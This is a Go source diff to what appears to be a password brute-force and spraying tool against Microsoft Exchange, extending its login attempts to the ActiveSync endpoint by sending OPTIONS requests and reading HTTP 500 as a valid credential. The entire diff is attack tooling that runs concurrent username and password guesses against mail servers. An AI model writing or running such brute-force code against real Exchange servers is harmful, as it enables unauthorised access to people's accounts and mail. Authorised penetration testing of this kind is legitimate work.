@@ -25,7 +25,7 @@ type Result struct {
 }
 
 var truestatus = 200
-
+var method = "GET"
 var concurrency = 3 //limit the number of consecutive attempts
 var delay = 5
 var consc = 3
@@ -173,6 +173,9 @@ func BruteForce() {
 		truestatus = 404
 	} else if strings.Contains(lowerAutodiscoverURL, strings.ToLower("/Mapi")) || strings.Contains(lowerAutodiscoverURL, strings.ToLower("/Ews")) {
 		truestatus = 500
+	} else if strings.Contains(lowerAutodiscoverURL, strings.ToLower("/Microsoft-Server-ActiveSync")) {
+		method = "OPTIONS"
+		truestatus = 500
 	}
 
 	for index, p := range passwords {
@@ -195,7 +198,7 @@ func BruteForce() {
 
 			go func(u string, p string, i int) {
 				defer func() { <-sem }()
-				out := connect(autodiscoverURL, u, p, basic, insecure)
+				out := connect(autodiscoverURL, u, p, basic, insecure, method)
 				out.Index = i
 
 				fmt.Println(out.Status)
@@ -241,7 +244,7 @@ func BruteForce() {
 
 			go func(u string, p string, i int) {
 				defer func() { <-sem }()
-				out := connect(autodiscoverURL, u, p, basic, insecure)
+				out := connect(autodiscoverURL, u, p, basic, insecure, method)
 				out.Index = i
 
 				if verbose == true && out.Status != truestatus {
@@ -273,6 +276,9 @@ func UserPassBruteForce() {
 	} else if strings.Contains(lowerAutodiscoverURL, strings.ToLower("/Rpc")) || strings.Contains(lowerAutodiscoverURL, strings.ToLower("/api")) {
 		truestatus = 404
 	} else if strings.Contains(lowerAutodiscoverURL, strings.ToLower("/Mapi")) || strings.Contains(lowerAutodiscoverURL, strings.ToLower("/Ews")) {
+		truestatus = 500
+	} else if strings.Contains(lowerAutodiscoverURL, strings.ToLower("/Microsoft-Server-ActiveSync")) {
+		method = "OPTIONS"
 		truestatus = 500
 	}
 
@@ -307,7 +313,7 @@ func UserPassBruteForce() {
 
 		go func(u string, p string) {
 			defer func() { <-sem }()
-			out := connect(autodiscoverURL, u, p, basic, insecure)
+			out := connect(autodiscoverURL, u, p, basic, insecure, method)
 			if verbose == true && out.Status != truestatus {
 				utils.Fail.Printf("Failed: %s:%s\n", out.Username, out.Password)
 				if out.Error != nil {
@@ -346,7 +352,7 @@ func readFile(filename string) []string {
 	return outputs
 }
 
-func connect(autodiscoverURL, user, password string, basic, insecure bool) Result {
+func connect(autodiscoverURL, user, password string, basic, insecure bool, method string) Result {
 	result := Result{user, password, -1, -1, nil}
 
 	cookie, _ := cookiejar.New(nil)
@@ -383,7 +389,7 @@ func connect(autodiscoverURL, user, password string, basic, insecure bool) Resul
 		}
 	}
 
-	req, err := http.NewRequest("GET", autodiscoverURL, nil)
+	req, err := http.NewRequest(method, autodiscoverURL, nil)
 	req.Header.Add("Content-Type", "text/xml")
 	req.Header.Add("User-Agent", userAgent)
 
